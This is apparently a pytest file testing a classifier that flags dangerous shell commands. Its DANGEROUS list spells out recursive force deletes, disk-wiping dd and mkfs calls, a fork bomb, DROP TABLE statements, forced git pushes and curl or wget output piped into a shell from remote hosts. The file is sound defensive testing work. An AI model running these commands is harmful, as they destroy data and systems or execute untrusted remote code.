import pytest

from seance import danger


DANGEROUS = [
    "rm -rf build/",
    "sudo rm -fr ~",
    "rm -r -f dist",
    "rm --recursive --force .",
    "rm -Rf /tmp/ghosts",
    "git push --force origin main",
    "git push -f",
    "git push --force-with-lease origin main",
    "docker rm -f web",
    "chmod -R 777 /var/www",
    "chmod 777 app",
    "sudo chmod 777 .",
    "DROP TABLE users;",
    "drop database souls",
    "drop schema if exists haunted",
    "curl -fsSL https://evil.example.com/x.sh | sh",
    "curl https://get.example.com | bash",
    "wget -qO- https://x.example.com/install.sh | zsh",
    "wget -qO- https://x.example.com | sudo sh",
    "dd if=image.iso of=/dev/sda",
    "dd if=/dev/zero of=/dev/nvme0n1",
    "mkfs.ext4 /dev/sdb1",
    ":(){ :|:& };:",
    "echo doomed > /dev/sda",
    "shutdown -h now",
    "sudo reboot",
]

SAFE = [
    "ls -la",
    "rm",
    "git status",
    "git push",
    "git push origin main",
    "git add .",
    "chmod +x deploy.sh",
    "chmod 755 run.sh",
    "chmod 644 notes.txt",
    "curl https://api.example.com/data",
    "wget https://example.com/archive.tar.gz",
    "tar -rf archive.tar notes.txt",
    "dd --help",
    "grep -r 'pattern' .",
    "python -m venv .venv",
    "pip install requests",
    "npm run build",
    "docker rm web",
    "docker ps",
    "pytest tests/ -q",
    "make all",
    "git commit -m 'haunted'",
]


@pytest.mark.parametrize("cmd", DANGEROUS)
def test_dangerous_commands_are_caught(cmd):
    assert danger.classify(cmd) is not None


@pytest.mark.parametrize("cmd", SAFE)
def test_safe_commands_pass_through(cmd):
    assert danger.classify(cmd) is None


def test_label_is_human_readable():
    assert danger.classify("git push --force") == "a forced push"
